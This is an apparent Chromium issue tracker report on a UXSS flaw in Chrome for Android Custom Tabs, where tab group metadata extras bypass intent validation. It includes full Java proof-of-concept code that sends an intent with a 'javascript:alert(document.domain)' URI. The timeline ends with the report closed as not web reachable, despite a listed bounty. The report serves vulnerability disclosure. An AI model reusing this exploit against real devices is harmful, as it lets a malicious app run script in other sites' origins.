# UXSS in Chrome for Android

| Field | Value |
|-------|-------|
| **Issue ID** | [507743677](https://issues.chromium.org/issues/507743677) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | UI>Browser>Mobile |
| **Platforms** | Android |
| **Reporter** | ad...@gmail.com |
| **Assignee** | hi...@google.com |
| **Created** | 2026-04-29 |
| **Bounty** | $1,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

**VULNERABILITY DETAILS**

At [launchCustomTabActivity](https://source.chromium.org/chromium/chromium/src/+/main:chrome/android/java/src/org/chromium/chrome/browser/LaunchIntentDispatcher.java;drc=3d66a79c4a7db65e46ba9b02226475a77db52d46;l=238), for validation of the intent, `shouldIgnoreIntent` method from `IntentHandler` class is used:

```
...
        boolean isCustomTab = true;
        if (IntentHandler.shouldIgnoreIntent(mIntent, mActivity, isCustomTab)) {
            return false;
        }
...

```

However, `CustomTabActivity` doesn't make use of `TabGroupMetadata` or `MultiTabMetadata` for loading urls. This makes it possible to bypass this check entirely by sending an intent which contains both intent data with a `javascript:` uri and an extra which would instantiate `TabGroupMetadata` or `MultiTabMetadata` .

This method returns early if either of these instantiated objects contain a valid url and the condition will become false, thus bypassing the check.

The uri then ends up in `navigate` method of [CustomTabActivityNavigationController](https://source.chromium.org/chromium/chromium/src/+/main:chrome/android/java/src/org/chromium/chrome/browser/customtabs/content/CustomTabActivityNavigationController.java;drc=8588b53b02b80dba2d065324bea2ea429bc69b37;l=203)
which loads the uri in the current tab

**VERSION**

Chrome Version: 147.0.7727.101 (Stable)

Operating System: Android 16

**BISECT**

At commit id [4a0ebaa](https://codereview.chromium.org/1157433002) a method was introduced to load the url in current running tab instance provided that, session id from the intent matches that of previous one.

> Note: Here, the activity is `HostedActivity` which gets renamed to `CustomTabActivity` in a future commit.

**REPRODUCTION CASE**

1. Create an Android studio project.
2. Create an activity
3. In `onCreate` method of the activity, paste the given code
4. Run the app

If you need a pre-built app, I can provide one

A video demonstration of the exploit is attached.

```
Intent inner = new Intent();
PendingIntent pIntent = PendingIntent.getActivity(this,1,inner,FLAG_IMMUTABLE);

                IBinder iBinder = new ICustomTabsCallback.Stub() {
                    @Override
                    public void onNavigationEvent(int i, Bundle bundle) throws RemoteException {

                    }
                    @Override
                    public void extraCallback(String s, Bundle bundle) throws RemoteException {

                    }
                    @Override
                    public void onMessageChannelReady(Bundle bundle) throws RemoteException {

                    }

                    @Override
                    public void onPostMessage(String s, Bundle bundle) throws RemoteException {

                    }
@Override
                    public void onRelationshipValidationResult(int i, Uri uri, boolean b, Bundle bundle) throws RemoteException {

                    }

                    @Override
                    public Bundle extraCallbackWithResult(String s, Bundle bundle) throws RemoteException {
                        return null;
                    }

                    @Override
                    public void onActivityResized(int i, int i1, Bundle bundle) throws RemoteException {

                    }

                    @Override
                    public void onWarmupCompleted(Bundle bundle) throws RemoteException {

                    }

                    @Override
                    public void onActivityLayout(int i, int i1, int i2, int i3, int i4, Bundle bundle) throws RemoteException {

                    }

                    @Override
                    public void onMinimized(Bundle bundle) throws RemoteException {

                    }

                    @Override
                    public void onUnminimized(Bundle bundle) throws RemoteException {

                    }

                    @Override
                    public int getInterfaceVersion() throws RemoteException {
                        return 0;
                    }
                };
Bundle b = new Bundle();
                b.putBinder("android.support.customtabs.extra.SESSION",iBinder);

                Map.Entry<Object, Object> entry =
                        new AbstractMap.SimpleImmutableEntry<>(1, "https://www.google.com");
                ArrayList taburl = new ArrayList();
                taburl.add(entry);
                Bundle innerBundle = new Bundle();
                innerBundle.putLong("high",1);
                innerBundle.putLong("low",1);
                Bundle exp = new Bundle();
                exp.putBundle("tabGroupId",innerBundle);
                exp.putSerializable("tabIdsToUrls",taburl);
                exp.putInt("selectedTabId",1);
                exp.putInt("sourceWindowId",1);
                exp.putInt("tabGroupColor",1);
                exp.putBoolean("tabGroupCollapsed",false);
                exp.putBoolean("isGroupShared",true);
                exp.putBoolean("isIncognito",false);

                Intent in = new Intent();
                in.setClassName("com.android.chrome","com.google.android.apps.chrome.IntentDispatcher");
                in.putExtra("android.support.customtabs.extra.SESSION_ID",pIntent);
                in.setData(Uri.parse("https://www.google.com"));

                in.putExtras(b);

                startActivity(in);
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {

                        in.putExtra("org.chromium.chrome.browser.tab_group_metadata",exp);

                        in.setDataAndType(Uri.parse("javascript:alert(document.domain)"),"text/plain");


                        startActivity(in);

                    }
                }, 2000);

```

## Attachments

- [poc.mp4](attachments/poc.mp4) (video/mp4, 3.3 MB)

## Timeline

### ye...@google.com (2026-04-29)

The PoC requires creating a different Android app, there is no evidence this is web reachable in chromium.

### ad...@gmail.com (2026-04-29)

Yes, this is not web reachable bug.
But a similar issue has been accepted before
<https://issues.chromium.org/issues/493955234>

### ch...@google.com (2026-04-29)

This issue has been closed as an incomplete or invalid report and we will not respond to further comments. If you can improve your report please open a fresh issue that addresses any feedback provided.

For more information on our vulnerability policies, please refer to <https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md>

### eb...@google.com (2026-08-13)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/507743677)*
